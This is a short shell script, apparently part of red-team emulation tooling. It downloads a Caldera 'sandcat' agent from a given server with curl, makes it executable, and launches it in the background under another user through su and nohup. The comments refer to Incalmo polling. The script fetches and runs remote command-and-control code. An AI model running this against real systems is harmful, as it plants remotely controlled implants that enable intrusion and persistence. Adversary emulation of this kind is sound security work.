server="$1";
target_user="$2";
dir=/tmp;
agent=$(cd $dir && curl -svkOJ -X POST -H "file:sandcat.go" -H "platform:linux" $server/file/download 2>&1 | grep -i "Content-Disposition" | grep -io "filename=.*" | cut -d'=' -f2 | tr -d '"\r') && chmod +x $dir/$agent 2>/dev/null;
# Trailing >/dev/null 2>&1 redirects the `su -c` shell's own fds so it doesn't linger holding the
# command's output pipe (else Incalmo's 45s poll times out). Same fix as downloadAgent.sh.
su - "$target_user" -c "cd $dir && nohup ./$agent -server $server -group red >/dev/null 2>&1 &" >/dev/null 2>&1